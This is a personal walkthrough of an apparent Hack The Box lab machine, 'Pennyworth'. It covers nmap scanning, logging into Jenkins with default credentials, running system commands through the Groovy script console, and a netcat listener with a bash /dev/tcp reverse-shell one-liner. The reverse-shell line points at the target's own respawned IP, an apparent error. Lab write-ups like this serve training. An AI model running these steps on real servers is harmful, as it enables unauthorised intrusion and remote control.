# Pennyworth

> 10.129.59.175

## Nmap
```
nmap 10.129.59.175
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-14 21:37 EDT
Nmap scan report for 10.129.59.175
Host is up (0.049s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT     STATE SERVICE
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 0.85 seconds
```

```
nmap -sS -sV -sC -O -p 8080 10.129.59.175
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-14 21:39 EDT
Nmap scan report for 10.129.59.175
Host is up (0.049s latency).

PORT     STATE SERVICE VERSION
8080/tcp open  http    Jetty 9.4.39.v20210325
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
|_http-server-header: Jetty(9.4.39.v20210325)
| http-robots.txt: 1 disallowed entry 
|_/
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 4.15 - 5.8 (96%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.5 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.26 seconds
```

## Jetty
> Eclipse Jetty is a Java web server and Java Servlet container. While web servers are usually associated with serving documents to people, Jetty is now often used for machine to machine communications, usually within larger software frameworks.

## Jenkins
- Access the site: `http://10.129.59.175:8080`
- You get a login screen that says, "Welcome to Jenkins!" and asks for username and password.
- Found an nse script here: https://github.com/icarot/NSE_scripts/blob/master/jenkins-info.nse
  - Downloaded and just ran it...
```
nmap --script jenkins-info -p 8080 10.129.59.175
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-14 22:05 EDT
Nmap scan report for 10.129.59.175
Host is up (0.049s latency).

PORT     STATE SERVICE
8080/tcp open  http-proxy
| jenkins-info: 
|   Hudson Version: 1.395
|   Jenkins Version: 2.289.1
|   Jenkins Session ID: aa6c090a
|_  Server: Jetty(9.4.39.v20210325)

Nmap done: 1 IP address (1 host up) scanned in 0.44 seconds
```

Google search: "jenkins default credentials"
- Results: admin:password
- Didn't work. "admin" is a Windows login.
- **root:password** worked and I got in.

In order to get to the Groovy Script CLI page: 
> Jenkins features a [Groovy script console](https://www.jenkins.io/doc/book/managing/script-console/) which allows one to run arbitrary Groovy scripts within the Jenkins controller runtime or in the runtime on agents.
- The Script Console on the controller can be accessed from "Manage Jenkins" > "Script Console" (takes you to: `/cli`). Or by visiting the sub-URL `/script` on your Jenkins instance.
  - The former takes you to a list of "Available Commands," but I could not access the actual CLI.
  - Using the `/script` in the URL took me right to the CLI. 

----
> respawn: 10.129.212.139

I tried some arbitrary commands in the CLI: 
- `which bash` : gave me an error
- `ifconfig`   : gave me an error
- And so I Googled for help...

[How to Execute Commands in Groovy](https://groovy-lang.gitlab.io/101-scripts/basico/command_local-en.html)
- You need to use the `execute()` method.
- The following found [here](https://stackoverflow.com/questions/2701547/how-to-make-system-command-calls-in-java-groovy): 
  - The simplest way to invoke an external process in Groovy is to use the execute() command on a string. For example, to execute maven from a groovy script run this:
```
"cmd /c mvn".execute()
```
  - If you want to capture the output of the command and maybe print it out, you can do this:
```
print "cmd /c mvn".execute().text
```
  - The 'cmd /c' at the start invokes the Windows command shell. Since mvn.bat is a batch script you need this. For Unix you can invoke the system shell.



- Some stuff I tried:
```
"cat /etc/passwd ".execute().text   # that printed the /etc/passwd file
"ifconfig".execute().text           # that showed me network info
"which bash".execute().text         # result: /usr/bin/bash
"bash --version".execute().text     # result: version 5.0.17(1)-release
```

Therefore I can execute arbitrary system commands on the box as root. 

## Pwn
- The famous bash one-liner
### Set up a listener on my local/attack machine: 
```
nc -nvlp 1234     # TCP listener
nc -nvlup 1234    # UDP listener
```

### Executed the Bash One-Liner: 
```
/bin/bash -c 'bash -i &> /dev/tcp/10.129.212.139/1234 0>&1'
```

